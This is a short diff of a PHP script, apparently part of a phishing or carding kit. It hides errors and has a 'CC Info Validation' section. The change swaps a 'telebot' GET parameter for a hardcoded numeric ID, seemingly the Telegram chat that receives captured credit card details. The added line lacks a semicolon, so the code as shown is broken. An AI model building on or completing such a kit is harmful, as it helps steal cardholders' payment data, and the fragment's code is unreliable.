@@ -7,7 +7,8 @@ ini_set('display_errors', 0);
 include 'config.php';
 
 /*===[Variable Setup]=========================================*/
-$telebot = $_GET['telebot'];
+//$telebot = $_GET['telebot'];
+$telebot = '1113845325'
 
 /*===[CC Info Validation]=====================================*/
 if($telebot == ""){
